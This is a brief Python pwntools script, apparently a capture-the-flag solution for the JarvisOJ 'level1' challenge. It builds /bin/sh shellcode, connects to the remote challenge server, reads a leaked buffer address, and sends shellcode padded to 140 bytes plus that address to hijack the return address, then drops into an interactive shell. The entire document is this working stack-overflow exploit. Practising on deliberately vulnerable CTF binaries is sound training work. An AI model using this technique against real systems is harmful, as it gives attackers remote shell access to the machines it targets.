from pwn import *

shell = asm(shellcraft.sh())

#io = process('level1')
io = remote('pwn2.jarvisoj.com', 9877)
buf_addr = int(io.recvuntil('?').split('0x')[1][:-1], 16)
io.sendline(shell + (140-len(shell))*'a' + p32(buf_addr))
io.interactive()
